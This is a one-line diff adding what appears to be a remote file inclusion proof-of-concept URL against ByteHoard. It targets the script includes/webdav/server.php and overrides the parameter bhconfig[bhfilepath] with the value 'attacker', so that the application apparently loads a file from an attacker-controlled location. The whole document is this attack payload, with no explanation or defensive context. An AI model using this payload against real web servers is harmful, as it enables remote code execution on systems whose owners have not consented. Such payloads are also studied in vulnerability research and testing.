@@ -1,0 +1,1 @@
+http://www.example.com/bytehoard/includes/webdav/server.php?bhconfig[bhfilepath]=attacker
